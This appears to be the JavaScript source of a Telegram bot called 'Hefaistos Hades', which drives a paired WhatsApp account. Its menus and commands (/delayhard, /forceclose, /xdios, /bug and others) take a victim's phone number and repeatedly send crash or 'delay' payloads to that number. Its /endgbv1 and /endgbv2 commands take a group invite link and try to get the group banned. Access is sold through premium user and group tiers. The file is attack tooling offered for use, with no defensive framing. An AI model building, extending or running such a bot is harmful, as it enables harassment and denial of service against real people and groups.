// =================== BLOCKED COMMAND ===================
const BLOCKED_FILE = path.join(__dirname, "blocked_commands.json");
let blockedCommands = [];
try {
  if (fs.existsSync(BLOCKED_FILE)) {
    const d = JSON.parse(fs.readFileSync(BLOCKED_FILE, "utf8"));
    blockedCommands = Array.isArray(d) ? d.map((x) => String(x).toLowerCase().trim()) : [];
  }
} catch {}
const saveBlocked = () => fs.writeFileSync(BLOCKED_FILE, JSON.stringify(blockedCommands, null, 2));
const normCmd = (s) => String(s || "").trim().toLowerCase().replace(/^\//, "");
const isBlocked = (c) => blockedCommands.includes(normCmd(c));

// =================== POINT SYSTEM ===================
const POINTS_FILE = path.join(__dirname, "points.json");
function loadPoints() {
  try {
    if (!fs.existsSync(POINTS_FILE)) fs.writeFileSync(POINTS_FILE, JSON.stringify({}, null, 2));
    return JSON.parse(fs.readFileSync(POINTS_FILE, "utf8") || "{}");
  } catch { return {}; }
}
const savePoints = (d) => fs.writeFileSync(POINTS_FILE, JSON.stringify(d, null, 2));
function ensurePoint(user) {
  const db = loadPoints();
  const id = String(user.id);
  db[id] = db[id] || { id, name: user.username ? `@${user.username}` : user.first_name || "User", points: 0, win: 0, lose: 0, draw: 0 };
  db[id].name = user.username ? `@${user.username}` : user.first_name || "User";
  savePoints(db);
  return db;
}
const addWin  = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 3; d[String(u.id)].win += 1; savePoints(d); };
const addLose = (u) => { const d = ensurePoint(u); d[String(u.id)].lose += 1; savePoints(d); };
const addDraw = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 1; d[String(u.id)].draw += 1; savePoints(d); };
const getPoint = (id) => loadPoints()[String(id)] || null;
const getTop = (n = 10) => Object.values(loadPoints()).sort((a, b) => b.points - a.points).slice(0, n);
const addSuitWin  = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 2; d[String(u.id)].win += 1; savePoints(d); };
const addSuitLose = (u) => { const d = ensurePoint(u); d[String(u.id)].lose += 1; savePoints(d); };
const addSuitDraw = (u) => { const d = ensurePoint(u); d[String(u.id)].draw += 1; savePoints(d); };

// =================== WHATSAPP SESSION ===================
async function startSesi() {
  console.clear();
  console.log(chalk.bold.yellow(`
  ⬡═—⊱ CHECKING SERVER ⊰—═⬡
  ┃ Bot Sukses Terhubung, Makasih
  ⬡═―—―――――――――――――――――—═⬡
  `));

  const store = makeInMemoryStore();
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "5.15.7"],
    getMessage: async () => ({ conversation: "Apophis" }),
  });

  global.sock = sock;

  sock.ev.on("creds.update", saveCreds);
  store.bind(sock.ev);

  sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
    if (connection === "open") {
      if (lastPairingMessage) {
        const txt = `<blockquote><pre>
⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Number       : ${lastPairingMessage.phoneNumber}
⌑ Pairing Code : ${lastPairingMessage.pairingCode}
⌑ Type         : Sudah Terhubung
╘—————————————————═⬡
</pre></blockquote>`;
        bot.telegram.editMessageCaption(lastPairingMessage.chatId, lastPairingMessage.messageId, undefined, txt, { parse_mode: "HTML" }).catch(() => {});
      }

      isWhatsAppConnected = true;
      console.log(chalk.bold.yellow(`
  ⬡═—⊱ SENDER ONLINE ⊰—═⬡
  ┃ Sukses Terhubung, Terima Kasih
  ⬡═―—―――――――――――――――――—═⬡
  `));
    }

    if (connection === "close") {
      const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red("WA terputus:"), reconnect ? "Mencoba reconnect..." : "Perlu pairing ulang.");
      if (reconnect) startSesi();
      isWhatsAppConnected = false;
    }
  });
}
startSesi();

// =================== MIDDLEWARE ===================
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  next();
};

const checkCooldown = (ctx, next) => {
  const id = ctx.from.id;
  const now = Date.now();
  if (userCooldowns.has(id)) {
    const diff = (now - userCooldowns.get(id)) / 500;
    if (diff < cooldown) return ctx.reply(`⏳ ☇ Sabar dulu ${Math.ceil(cooldown - diff)} detik ya.`);
  }
  userCooldowns.set(id, now);
  next();
};

const premGroupOnly = () => async (ctx, next) => {
  if (ctx.chat?.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  if (!isPremGroup(ctx.chat.id)) {
    const t = esc(ctx.chat?.title || "Grup ini");
    return ctx.reply(`❌ ☇ <b>${t}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, { parse_mode: "HTML" });
  }
  next();
};

// =================== RICH HTML BUILDER ===================
function buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus) {
  return `
<h1>⚔️ Hefaistos Hades</h1>
<p><i>System Control • WhatsApp Bug Bot</i></p>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<p>Halo <b>${esc(userFirst)}</b> 👋 selamat datang kembali.</p>
<h2>📊 Status System</h2>
<table>
  <tr><th>Komponen</th><th>Status</th></tr>
  <tr><td>Sender</td><td><b>${senderStatus}</b></td></tr>
  <tr><td>Runtime</td><td><code>${runtimeStatus}</code></td></tr>
  <tr><td>Memory</td><td><code>${memoryStatus}</code></td></tr>
  <tr><td>Akses Kamu</td><td><b>${premiumStatus}</b></td></tr>
</table>
<hr/>
<h2>✨ Fitur Utama</h2>
<checklist>
  <li checked>Bug Delay &amp; Crash</li>
  <li checked>Pairing WhatsApp</li>
  <li checked>Premium Group System</li>
  <li checked>Auto Update Script</li>
  <li checked>Game Tic Tac Toe &amp; Suit</li>
</checklist>
<hr/>
<details>
  <summary>📌 Info Developer</summary>
  <p>Developer : <b>@shinracery</b></p>
  <p>Version   : <b>New</b></p>
  <p>Language  : <b>JavaScript</b></p>
</details>
<p>Tekan tombol <b>Open Menu</b> di bawah buat mulai.</p>
`.trim();
}

const START_KEYBOARD = [[
  { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/setting_menu", style: "success", icon_custom_emoji_id: "6163328887813051603" },
]];

const SETTING_KEYBOARD = [
  [
    { text: "𝐁𝐚𝐜𝐤", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5463167176099780578" },
    { text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "/bug_menu", style: "success", icon_custom_emoji_id: "5267231489610760977" },
  ],
  [
    { text: "𝐁𝐮𝐠 𝐏𝐢𝐥𝐢𝐡", callback_data: "/bug_pick_menu", style: "primary", icon_custom_emoji_id: "5267231489610760977" },
    { text: "𝐁𝐚𝐧 𝐆𝐫𝐨𝐮𝐩", callback_data: "/ban_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
  ],
];

const BUG_KEYBOARD = [
  [
    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
    { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/start", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
  ],
];

const BUG_PICK_KEYBOARD = [
  [
    { text: "Forceclose", callback_data: "bug_pick_forceclose", style: "danger" },
    { text: "Delayhard",  callback_data: "bug_pick_delayhard",  style: "success" },
  ],
  [
    { text: "Ghost",   callback_data: "bug_pick_ghost",   style: "success" },
    { text: "Forcezz", callback_data: "bug_pick_forcezz", style: "danger" },
  ],
  [
    { text: "Xdios", callback_data: "bug_pick_xdios", style: "primary" },
  ],
  [
    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
    { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/start", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
  ],
];

// ---------- Ban keyboard: cuma New Poll + Back + Open Menu ----------
const BAN_KEYBOARD = [
  [
    { text: "💢 New Poll", callback_data: "/ban_poll_menu", style: "success", icon_custom_emoji_id: "6163328887813051603" },
  ],
  [
    { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
    { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/start", style: "primary", icon_custom_emoji_id: "6163328887813051603" },
  ],
];

// =================== POLL STORE ===================
const activeBanPolls   = new Map(); // pollId -> { chatId, msgId, userId }
const userLastBanPoll  = new Map(); // userId -> pollId

// =================== PENDING STATE ===================
const pendingBugUser = new Map();
const pendingBanUser = new Map();

// =================== /start ===================
bot.start(async (ctx) => {
  const userId        = ctx.from.id;
  const senderStatus  = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
  const runtimeStatus = formatRuntime();
  const memoryStatus  = formatMemory();
  const premiumStatus = isPremiumUser(userId) ? "Premium" : "Free";
  const userFirst     = ctx.from.first_name || ctx.from.username || "Kak";

  const html = buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus);

  try {
    await ctx.telegram.callApi("sendRichMessage", {
      chat_id: ctx.chat.id, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
    });
  } catch (err) {
    console.log("rich gagal, fallback ke foto:", err?.response?.description || err.message);
    const fallback = `
<blockquote>•.¸ Hefaistos Hades ¸.•</blockquote>
↯ Developer : @shinracery
↯ Version   : New
↯ Language  : JavaScript

<blockquote>「 𝖲𝗍𝖺𝗍𝗎𝗌𝖾𝖽 」</blockquote>
↯ Sender  : ${senderStatus}
↯ Runtime : ${runtimeStatus}
`.trim();
    await ctx.replyWithPhoto(thumbnailUrl, { caption: fallback, parse_mode: "HTML", reply_markup: { inline_keyboard: START_KEYBOARD } });
  }
});

// =================== CALLBACK: MENU UTAMA ===================
bot.action("/start", async (ctx) => {
  await ctx.answerCbQuery();
  const senderStatus  = isWhatsAppConnected ? "Aktif" : "Tidak Aktif";
  const runtimeStatus = formatRuntime();
  const memoryStatus  = formatMemory();
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Premium" : "Free";
  const userFirst     = ctx.from.first_name || ctx.from.username || "Kak";
  const msgId = ctx.callbackQuery.message.message_id;
  const html  = buildStartHtml(userFirst, senderStatus, runtimeStatus, memoryStatus, premiumStatus);

  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: START_KEYBOARD },
    });
  } catch (err) {
    console.log("edit rich gagal:", err?.response?.description || err.message);
  }
});

// =================== BUG MENU ===================
bot.action("/bug_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;

  const html = `
<h2>BUG MENU</h2>
<p><i>(Page 3/4) • Hefaistos Hades</i></p>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<h2>Delay Bug</h2>
<ul>
  <li>/delayhard  • Delay Hard</li>
  <li>/ghost      • Delay Ghost</li>
  <li>/forceclose • Force Close</li>
  <li>/forcezz    • Force Zezz</li>
  <li>/xdios      • Delay Xdios</li>
</ul>
<hr/>
<h2>Crash Bug</h2>
<ul>
  <li>/bug • Pilih jenis bug dari tombol</li>
</ul>
<hr/>
<p><i>Ketik /stopbug buat berhentiin spam.</i></p>
`.trim();

  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BUG_KEYBOARD },
    });
  } catch (err) { console.log("bug_menu gagal:", err?.response?.description || err.message); }
});

// =================== BUG PICK MENU ===================
bot.action("/bug_pick_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;

  const html = `
<h2>BUG PICK MENU</h2>
<p><i>Pilih metode bug di bawah, lalu kirim nomor target.</i></p>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<h2>Daftar Bug</h2>
<ul>
  <li>Forceclose</li>
  <li>Delayhard</li>
  <li>Ghost</li>
  <li>Forcezz</li>
  <li>Xdios</li>
</ul>
<hr/>
<p><i>Klik tombol di bawah buat pilih bug.</i></p>
`.trim();

  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BUG_PICK_KEYBOARD },
    });
  } catch (err) { console.log("bug_pick_menu gagal:", err?.response?.description || err.message); }
});

// =================== BAN MENU ===================
bot.action("/ban_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;

  const html = `
<h2>BAN GROUP MENU</h2>
<p><i>(Page 4/4) • Hefaistos Hades</i></p>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<h2>Metode Ban</h2>
<ul>
  <li>End GB v1 (End Gb V1)</li>
  <li>End GB v2 (End Gb V2)</li>
</ul>
<hr/>
<p><i>Klik <b>💢 New Poll</b> di bawah buat pilih metode ban lewat poll.</i></p>
`.trim();

  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: BAN_KEYBOARD },
    });
  } catch (err) { console.log("ban_menu gagal:", err?.response?.description || err.message); }
});

// =================== BAN POLL MENU (NEW POLL) ===================
bot.action("/ban_poll_menu", async (ctx) => {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  await ctx.answerCbQuery("🆕 Buka poll ban");

  // hapus poll lama user ini kalau ada
  const oldId = userLastBanPoll.get(userId);
  if (oldId) {
    const old = activeBanPolls.get(oldId);
    if (old) {
      bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {});
      activeBanPolls.delete(oldId);
    }
    userLastBanPoll.delete(userId);
  }

  // kirim pesan info + tombol back aja (tanpa End GB v1 / v2)
  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: `
💢 <b>BAN POLL</b>
<i>Pilih metode ban lewat vote di bawah ⬇️</i>

Setelah milih, langsung kirim link grupnya.
`.trim(),
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐁𝐚𝐜𝐤", callback_data: "/ban_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" },
      ]],
    },
  }).catch(() => {});

  // kirim poll
  const pollMsg = await ctx.telegram.sendPoll(
    chatId,
    "🌸 Mau pakai metode ban yang mana?",
    ["End GB v1 (End Gb V1)", "End GB v2 (End Gb V2)"],
    {
      is_anonymous: false,
      allows_multiple_answers: false,
      open_period: 300,
    }
  ).catch((e) => { console.log("ban poll err:", e.message); return null; });

  if (!pollMsg || !pollMsg.poll) return;

  activeBanPolls.set(pollMsg.poll.id, {
    chatId,
    msgId: pollMsg.message_id,
    userId,
  });
  userLastBanPoll.set(userId, pollMsg.poll.id);
});

// =================== PILIH BUG DARI TOMBOL ===================
bot.action(/^bug_pick_(.+)$/, async (ctx) => {
  const userId  = ctx.from.id;
  const bugName = ctx.match[1];

  const label = {
    forceclose: "Forceclose",
    delayhard:  "Delayhard",
    ghost:      "Ghost",
    forcezz:    "Forcezz",
    xdios:      "Xdios",
  }[bugName] || bugName;

  pendingBugUser.set(userId, bugName);
  await ctx.answerCbQuery(`✅ ${label} dipilih`);

  const html = `
<h2>BUG: ${label.toUpperCase()}</h2>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<p>Sekarang kirim nomor target.</p>
<p><b>Contoh:</b> <code>628xxxxxxxx</code></p>
<hr/>
<p><i>Ketik nomornya aja, langsung kirim.</i></p>
`.trim();

  const kbd = [[{ text: "𝐁𝐚𝐜𝐤", callback_data: "/bug_pick_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }]];

  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: ctx.callbackQuery.message.message_id, rich_message: { html }, reply_markup: { inline_keyboard: kbd },
    });
  } catch (err) { console.log("pick bug err:", err?.response?.description || err.message); }
});

// =================== BUG TASKS BUILDER ===================
function getBugTasks(bugName, target) {
  switch (bugName) {
    case "forceclose":
      return [
        { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
        { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
        { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
        { name: "StuckLogo",     fn: () => StuckLogo(sock, target)     },
        { name: "StuckNewAmba",  fn: () => StuckNewAmba(sock, target)  },
      ];
    case "delayhard":
      return [
        { name: "StuckLogo",    fn: () => StuckLogo(sock, target)    },
        { name: "StuckNewAmba", fn: () => StuckNewAmba(sock, target) },
      ];
    case "ghost":
      return [
        { name: "StuckLogo",    fn: () => StuckLogo(sock, target)    },
        { name: "StuckNewAmba", fn: () => StuckNewAmba(sock, target) },
      ];
    case "forcezz":
      return [
        { name: "ForcloseVIDEO", fn: () => ForcloseVIDEO(sock, target) },
        { name: "ForcloseDOC",   fn: () => ForcloseDOC(sock, target)   },
        { name: "ForcloseSTC",   fn: () => ForcloseSTC(sock, target)   },
        { name: "StuckLogo",     fn: () => StuckLogo(sock, target)     },
        { name: "StuckNewAmba",  fn: () => StuckNewAmba(sock, target)  },
      ];
    case "xdios":
      return [
        { name: "iosswipper", fn: () => iosswipper(sock, target) },
        { name: "catchingOs", fn: () => catchingOs(target)        },
      ];
    default:
      return [];
  }
}

// =================== NANGKEP INPUT (bug pick + ban pick) ===================
bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const text   = ctx.message?.text || "";

  // ============ PENDING BAN ============
  if (pendingBanUser.has(userId)) {
    if (text.startsWith("/")) { pendingBanUser.delete(userId); return next(); }

    const targetInput = text.trim();
    if (!targetInput.includes("chat.whatsapp.com/")) {
      return ctx.reply("❌ Link gak valid. Kirim link WhatsApp, contoh:\n<code>https://chat.whatsapp.com/xxxxx</code>", { parse_mode: "HTML" });
    }

    const banName = pendingBanUser.get(userId);
    pendingBanUser.delete(userId);

    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);

    await ctx.reply("Succes Banned Group", {
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Details Target",
            url: `https://chat.whatsapp.com/${inviteCode}`,
            icon_custom_emoji_id: "5395444784611480792",
            style: "success",
          },
        ]],
      },
    });

    console.log("\x1b[32m[PROSES BAN GROUP]\x1b[0m TUNGGU HINGGA SELESAI");

    queue.add(async () => {
      try {
        if (banName === "endgb") {
          await proxzy(sock, inviteCode);
        } else if (banName === "endgbv2") {
          await BanGroup(sock, inviteCode);
        }
        console.log("\x1b[32m[SUCCESS]\x1b[0m Ban group selesai! 🚀");
        await ctx.reply("✅ Ban group selesai!");
      } catch (e) {
        console.error("ban gb err:", e.message);
        await ctx.reply(`❌ Gagal: ${e.message}`);
      }
    });
    return;
  }

  // ============ PENDING BUG ============
  if (!pendingBugUser.has(userId)) return next();
  if (text.startsWith("/")) { pendingBugUser.delete(userId); return next(); }

  const parts = text.trim().split(/\s+/);
  if (parts.length !== 1) return next();

  const rawNumber = parts[0];
  const target    = formatTarget(rawNumber);

  if (!target) return ctx.reply("❌ Nomor gak valid. Kirim ulang, contoh: <code>628xxxxxxxx</code>", { parse_mode: "HTML" });

  const bugName = pendingBugUser.get(userId);
  pendingBugUser.delete(userId);

  const label = {
    forceclose: "Forceclose",
    delayhard:  "Delayhard",
    ghost:      "Ghost",
    forcezz:    "Forcezz",
    xdios:      "Xdios",
  }[bugName] || bugName;

  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const tasks = getBugTasks(bugName, target);
  if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");

  spamForever(ctx, label, target, tasks);
});

// =================== POLL ANSWER (BAN POLL) ===================
bot.on("poll_answer", async (ctx) => {
  const ans = ctx.pollAnswer;
  const s = activeBanPolls.get(ans.poll_id);
  if (!s) return;

  const idx = ans.option_ids[0];
  if (idx === undefined) return;

  const options = ["endgb", "endgbv2"];
  const labels  = { endgb: "End GB v1", endgbv2: "End GB v2" };
  const banName = options[idx];
  const label   = labels[banName];
  if (!banName) return;

  const userId = ans.user.id;

  bot.telegram.deleteMessage(s.chatId, s.msgId).catch(() => {});
  activeBanPolls.delete(ans.poll_id);
  userLastBanPoll.delete(userId);

  pendingBanUser.set(userId, banName);

  await bot.telegram.sendMessage(
    s.chatId,
    `✅ <b>${label}</b> dipilih.\n\nKirim link grupnya sekarang (contoh: <code>https://chat.whatsapp.com/xxxxx</code>).`,
    { parse_mode: "HTML" }
  ).catch(() => {});
});

// =================== /stopbug ===================
bot.command("stopbug", async (ctx) => {
  const userId = ctx.from.id.toString();
  let count = 0;

  for (const [jobId, state] of activeSpam.entries()) {
    if (state.userId === userId) {
      state.stop = true;
      count++;
    }
  }

  if (count === 0) return ctx.reply("📌 Gak ada spam yang jalan.");
  return ctx.reply(`🛑 ${count} spam akan dihentikan...`);
});

// =================== SETTING MENU ===================
bot.action("/setting_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;

  const html = `
<h2>☰ SYSTEM CONTROL PANEL</h2>
<p><i>(Page 2/4) • 𝙷𝙴𝙵𝙰𝙸𝚂𝚃𝙾𝚂 𝙷𝙰𝙳𝙴𝚂</i></p>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<h3>☰ Connect Bot / Update</h3>
<ul>
  <li>/addpairing  → Add Sender</li>
  <li>/killsession → Delete Sender</li>
  <li>/update      → Auto Update</li>
</ul>
<h3>☰ Owners Settings</h3>
<ul>
  <li>/addpremgrup  → Add All Member</li>
  <li>/delpremgrup  → Remove All Member</li>
  <li>/listpremgrup → List Group</li>
</ul>
<h3>☰ Menu Lain</h3>
<ul>
  <li>Bug Menu (list command)</li>
  <li>Bug Pilih (tombol interaktif)</li>
  <li>Ban Group (tombol interaktif)</li>
</ul>
<hr/>
<p>Security Mode : <b>ACTIVE</b></p>
<p>Network       : <b>Hefaistos Hades Core</b></p>
`.trim();

  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: SETTING_KEYBOARD },
    });
  } catch (err) { console.log("setting_menu gagal:", err?.response?.description || err.message); }
});

// =================== COMMAND MANUAL BUG ===================
bot.command("delayhard", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /delayhard 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid...");

  const tasks = getBugTasks("delayhard", target);
  spamForever(ctx, "delayhard", target, tasks);
});

bot.command("ghost", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /ghost 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid...");

  const tasks = getBugTasks("ghost", target);
  spamForever(ctx, "ghost", target, tasks);
});

bot.command("forceclose", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /forceclose 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid...");

  const tasks = getBugTasks("forceclose", target);
  spamForever(ctx, "forceclose", target, tasks);
});

bot.command("forcezz", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /forcezz 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid...");

  const tasks = getBugTasks("forcezz", target);
  spamForever(ctx, "forcezz", target, tasks);
});

bot.command("xdios", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /xdios 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid...");

  const tasks = getBugTasks("xdios", target);
  spamForever(ctx, "xdios", target, tasks);
});

// =================== /endgbv1 ===================
bot.command("endgbv1", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!targetInput) return ctx.reply("📌 Format: /endgbv1 https://chat.whatsapp.com/xxxxx");
  if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid. Contoh:\n<code>/endgbv1 https://chat.whatsapp.com/xxxxx</code>", { parse_mode: "HTML" });

  const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);

  await ctx.reply("Succes Banned Group", {
    reply_markup: {
      inline_keyboard: [[
        {
          text: "Details Target",
          url: `https://chat.whatsapp.com/${inviteCode}`,
          icon_custom_emoji_id: "5395444784611480792",
          style: "success",
        },
      ]],
    },
  });

  console.log("\x1b[32m[PROSES BAN GROUP v1]\x1b[0m TUNGGU HINGGA SELESAI");

  queue.add(async () => {
    try {
      await proxzy(sock, inviteCode);
      console.log("\x1b[32m[SUCCESS]\x1b[0m Ban group v1 selesai! 🚀");
      await ctx.reply("✅ Ban group v1 selesai!");
    } catch (e) {
      console.error("endgbv1 err:", e.message);
      await ctx.reply(`❌ Gagal: ${e.message}`);
    }
  });
});

// =================== /endgbv2 ===================
bot.command("endgbv2", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");

  const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!targetInput) return ctx.reply("📌 Format: /endgbv2 https://chat.whatsapp.com/xxxxx");
  if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid. Contoh:\n<code>/endgbv2 https://chat.whatsapp.com/xxxxx</code>", { parse_mode: "HTML" });

  const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);

  await ctx.reply("Succes Banned Group", {
    reply_markup: {
      inline_keyboard: [[
        {
          text: "Details Target",
          url: `https://chat.whatsapp.com/${inviteCode}`,
          icon_custom_emoji_id: "5395444784611480792",
          style: "success",
        },
      ]],
    },
  });

  console.log("\x1b[32m[PROSES BAN GROUP v2]\x1b[0m TUNGGU HINGGA SELESAI");

  queue.add(async () => {
    try {
      await BanGroup(sock, inviteCode);
      console.log("\x1b[32m[SUCCESS]\x1b[0m Ban group v2 selesai! 🚀");
      await ctx.reply("✅ Ban group v2 selesai!");
    } catch (e) {
      console.error("endgbv2 err:", e.message);
      await ctx.reply(`❌ Gagal: ${e.message}`);
    }
  });
});

// =================== CRASH BUG (/bug) ===================
const clickedUsers = {};

bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Example : /bug 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
    { source: "./image/MagicClowerd.jpg" },
    {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Target : ${q}
⌑ Status : Ready
⌑ Note : No Spam Bug
⌑ Silahkan Pilih bug di bawah...
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `delay_${target}` },
            { text: "Force Close", callback_data: `fc_${target}` }
          ],
          [
            { text: "XDioS", callback_data: `blank_${target}` },
            { text: "Force Freez", callback_data: `bulldozer_${target}` }
          ]
        ]
      }
    }
  );
});

bot.on("callback_query", async (ctx) => {
  const userId = ctx.from.id;
